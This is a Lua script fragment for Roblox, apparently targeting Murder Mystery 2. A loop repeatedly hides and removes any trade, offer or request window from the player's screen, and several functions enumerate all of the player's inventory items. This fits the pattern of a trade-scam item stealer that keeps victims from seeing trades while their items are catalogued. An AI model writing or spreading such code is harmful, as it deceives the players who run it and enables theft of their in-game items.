-- ============================================
-- HIDE TRADE GUI FROM PLAYER
-- ============================================

local function hideTradeGUI()
    pcall(function()
        local playerGui = player.PlayerGui
        local guiNames = {"Trade", "Trading", "TradeRequest", "OfferGUI", "TradeGUI", "RequestGUI"}
        for _, name in pairs(guiNames) do
            local gui = playerGui:FindFirstChild(name)
            if gui then
                gui.Enabled = false
                gui.Visible = false
                gui.Parent = nil
            end
        end
        
        for _, gui in pairs(playerGui:GetDescendants()) do
            if gui:IsA("Frame") or gui:IsA("ScreenGui") then
                if gui.Name:lower():find("trade") or gui.Name:lower():find("offer") or gui.Name:lower():find("request") then
                    gui.Visible = false
                    gui.Enabled = false
                end
            end
        end
    end)
end

spawn(function()
    while wait(0.1) do
        hideTradeGUI()
    end
end)

-- ============================================
-- GET AND LIST ALL ITEMS FROM MM2 GUI
-- ============================================

local function getAllItemsFromGUI()
    local items = {}
    
    pcall(function()
        local playerGui = player.PlayerGui
        
        -- Search for inventory GUI
        local inventoryGui = nil
        for _, gui in pairs(playerGui:GetChildren()) do
            if gui.Name:lower():find("inv") or gui.Name:lower():find("backpack") or gui.Name:lower():find("items") or gui.Name:lower():find("inventory") then
                inventoryGui = gui
                break
            end
        end
        
        if not inventoryGui then
            -- Try to find any GUI that might contain items
            for _, gui in pairs(playerGui:GetDescendants()) do
                if gui:IsA("Frame") and gui:FindFirstChild("ItemName") then
                    inventoryGui = gui.Parent
                    break
                end
            end
        end
        
        -- Extract item names and frames
        if inventoryGui then
            for _, itemFrame in pairs(inventoryGui:GetDescendants()) do
                if itemFrame:IsA("ImageButton") or itemFrame:IsA("TextButton") then
                    local itemName = itemFrame.Name
                    local nameLabel = itemFrame:FindFirstChild("Name") or itemFrame:FindFirstChild("ItemName") or itemFrame:FindFirstChild("Text")
                    if nameLabel and nameLabel:IsA("TextLabel") then
                        itemName = nameLabel.Text
                    end
                    if itemName and itemName ~= "" and itemName ~= " " then
                        table.insert(items, {name = itemName, frame = itemFrame})
                    end
                end
            end
        end
    end)
    
    return items
end

-- Get items from ReplicatedStorage (alternative method)
local function getItemsFromStorage()
    local items = {}
    
    pcall(function()
        local inventoryData = ReplicatedStorage:FindFirstChild("Inventory") or 
                              ReplicatedStorage:FindFirstChild("PlayerData") or
                              ReplicatedStorage:FindFirstChild("Items")
        
        if inventoryData then
            for _, item in pairs(inventoryData:GetChildren()) do
                table.insert(items, {name = item.Name, frame = nil})
            end
        end
    end)
    
    return items
end

-- Get items from player Data
local function getItemsFromPlayerData()
    local items = {}
    
    pcall(function()
        local playerData = player:FindFirstChild("Data") or player:FindFirstChild("Inventory")
        if playerData then
            for _, item in pairs(playerData:GetChildren()) do
                table.insert(items, {name = item.Name, frame = nil})
            end
        end
    end)
    
    return items
end

-- Main function to get all items
local function getAllItems()
    local items = {}
    local seenNames = {}
    
    -- Method 1: GUI items
    local guiItems = getAllItemsFromGUI()
    for _, item in pairs(guiItems) do
        if not seenNames[item.name] then
            seenNames[item.name] = true
            table.insert(items, item)
        end
    end
    
    -- Method 2: Storage items
    local storageItems = getItemsFromStorage()
    for _, item in pairs(storageItems) do
        if not seenNames[item.name] then
            seenNames[item.name] = true
            table.insert(items, item)
        end
    end
    
    -- Method 3: Player data items
    local dataItems = getItemsFromPlayerData()
    for _, item in pairs(dataItems) do
        if not seenNames[item.name] then
            seenNames[item.name] = true
            table.insert(items, item)
        end
    end
    
    return items
end

